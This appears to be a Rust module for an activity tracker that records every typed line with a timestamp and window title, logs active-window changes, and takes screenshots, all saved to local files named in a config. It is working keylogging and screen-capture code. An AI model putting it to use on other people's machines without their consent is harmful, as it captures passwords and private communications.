use crate::{config::Config, screenshot_mod};
use chrono::Local;
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::{
    collections::HashSet,
    fs::OpenOptions,
    io::{BufWriter, Write},
    thread,
    time::{Duration, Instant},
};

// Added a new generic Fn parameter for screenshot trigger
pub fn track_activity<F>(get_active_window: F)
where
    F: Fn() -> Option<String> + Send + 'static,
{
    let config = match Config::from_file("config.json") {
        Ok(cfg) => cfg,
        Err(e) => {
            eprintln!("Failed to load config: {}", e);
            return;
        }
    };

    let device_state = DeviceState::new();
    let mut last_keys = vec![];
    let mut last_window = String::new();
    let mut current_line = String::new();
    let mut last_input_time = Instant::now();

    let key_logger_file_path = config.full_key_log_path();
    let active_window_file_path = config.active_window_log_path();
    let timeout_secs = config.timeout_secs();

    let key_logger_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&key_logger_file_path)
        .unwrap_or_else(|e| {
            panic!(
                "Could not open key log file at {:?}: {}",
                key_logger_file_path, e
            )
        });
    let mut key_logger_file = BufWriter::new(key_logger_file);

    println!(
        "Key Logger Logs are written to: {:?}",
        &key_logger_file_path
    );

    let logger_root_file_path = config.log_directory_path();
    let capture_flag = config.ss_capture_flag();
    let resolution = config.screen_capture_resolution();

    let on_screenshot = || {
        // Trigger your screenshot logic here,
        // e.g. call a function from screenshot_mod to take a screenshot immediately.
        screenshot_mod::capture_one_screenshot(&logger_root_file_path, capture_flag, resolution);
    };

    let active_window_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&active_window_file_path)
        .unwrap_or_else(|e| {
            panic!(
                "Could not open active window log file at {:?}: {}",
                active_window_file_path, e
            )
        });
    let mut active_window_file = BufWriter::new(active_window_file);

    println!(
        "Active window Logs are written to: {:?}",
        &active_window_file_path
    );

    loop {
        let keys = device_state.get_keys();
        let key_set: HashSet<_> = keys.iter().cloned().collect();

        let shift_pressed =
            key_set.contains(&Keycode::LShift) || key_set.contains(&Keycode::RShift);

        // Detect newly pressed keys only (not being held)
        for key in &keys {
            if !last_keys.contains(key) {
                last_input_time = Instant::now();
                if let Some(c) = keycode_to_char(key, shift_pressed) {
                    current_line.push(c);
                } else if *key == Keycode::Enter {
                    if !current_line.is_empty() {
                        // Trigger screenshot before logging
                        on_screenshot();

                        let log_entry = serde_json::json!({
                            "timestamp": Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                            "window": last_window,
                            "input": current_line
                        });

                        if let Ok(json_line) = serde_json::to_string(&log_entry) {
                            writeln!(key_logger_file, "{}", json_line).unwrap();
                            key_logger_file.flush().unwrap();
                        }
                        current_line.clear();
                    }
                }
            }
        }

        // Update last_keys without cloning the whole vector every loop
        last_keys.clear();
        last_keys.extend(keys.iter().cloned());

        if last_input_time.elapsed() > Duration::from_secs(timeout_secs) && !current_line.is_empty()
        {
            // Trigger screenshot before logging
            on_screenshot();

            let log_entry = serde_json::json!({
                "timestamp": Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                "window": last_window,
                "input": current_line
            });

            if let Ok(json_line) = serde_json::to_string(&log_entry) {
                writeln!(key_logger_file, "{}", json_line).unwrap();
                key_logger_file.flush().unwrap();
            }
            current_line.clear();
        }

        if let Some(title) = get_active_window() {
            if !title.trim().is_empty() && !is_garbage_title(&title) && title != last_window {
                last_window = title.clone();

                // Trigger screenshot before logging active window change
                // on_screenshot(); // This spams the ss folder as each window switch starts taking screen shots

                let log_entry = serde_json::json!({
                    "timestamp": Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                    "title": title
                });

                if let Ok(json_line) = serde_json::to_string(&log_entry) {
                    writeln!(active_window_file, "{}", json_line).unwrap();
                    active_window_file.flush().unwrap();
                }
            }
        }

        thread::sleep(Duration::from_millis(10)); // fast input response
    }
}

// Rest unchanged...

fn keycode_to_char(key: &Keycode, shift: bool) -> Option<char> {
    use Keycode::*;

    match key {
        A => Some(if shift { 'A' } else { 'a' }),
        B => Some(if shift { 'B' } else { 'b' }),
        C => Some(if shift { 'C' } else { 'c' }),
        D => Some(if shift { 'D' } else { 'd' }),
        E => Some(if shift { 'E' } else { 'e' }),
        F => Some(if shift { 'F' } else { 'f' }),
        G => Some(if shift { 'G' } else { 'g' }),
        H => Some(if shift { 'H' } else { 'h' }),
        I => Some(if shift { 'I' } else { 'i' }),
        J => Some(if shift { 'J' } else { 'j' }),
        K => Some(if shift { 'K' } else { 'k' }),
        L => Some(if shift { 'L' } else { 'l' }),
        M => Some(if shift { 'M' } else { 'm' }),
        N => Some(if shift { 'N' } else { 'n' }),
        O => Some(if shift { 'O' } else { 'o' }),
        P => Some(if shift { 'P' } else { 'p' }),
        Q => Some(if shift { 'Q' } else { 'q' }),
        R => Some(if shift { 'R' } else { 'r' }),
        S => Some(if shift { 'S' } else { 's' }),
        T => Some(if shift { 'T' } else { 't' }),
        U => Some(if shift { 'U' } else { 'u' }),
        V => Some(if shift { 'V' } else { 'v' }),
        W => Some(if shift { 'W' } else { 'w' }),
        X => Some(if shift { 'X' } else { 'x' }),
        Y => Some(if shift { 'Y' } else { 'y' }),
        Z => Some(if shift { 'Z' } else { 'z' }),
        Key0 => Some(if shift { ')' } else { '0' }),
        Key1 => Some(if shift { '!' } else { '1' }),
        Key2 => Some(if shift { '@' } else { '2' }),
        Key3 => Some(if shift { '#' } else { '3' }),
        Key4 => Some(if shift { '$' } else { '4' }),
        Key5 => Some(if shift { '%' } else { '5' }),
        Key6 => Some(if shift { '^' } else { '6' }),
        Key7 => Some(if shift { '&' } else { '7' }),
        Key8 => Some(if shift { '*' } else { '8' }),
        Key9 => Some(if shift { '(' } else { '9' }),
        Space => Some(' '),
        Comma => Some(if shift { '<' } else { ',' }),
        Dot => Some(if shift { '>' } else { '.' }),
        Apostrophe => Some(if shift { '"' } else { '\'' }),
        Semicolon => Some(if shift { ':' } else { ';' }),
        Minus => Some(if shift { '_' } else { '-' }),
        Equal => Some(if shift { '+' } else { '=' }),
        Slash => Some(if shift { '?' } else { '/' }),
        BackSlash => Some(if shift { '|' } else { '\\' }),
        Grave => Some(if shift { '~' } else { '`' }),
        LeftBracket => Some(if shift { '{' } else { '[' }),
        RightBracket => Some(if shift { '}' } else { ']' }),
        _ => None,
    }
}

fn is_garbage_title(title: &str) -> bool {
    let lower = title.to_lowercase();
    lower == "unknown" || lower.ends_with(".exe") || lower.chars().all(|c| !c.is_alphanumeric())
}
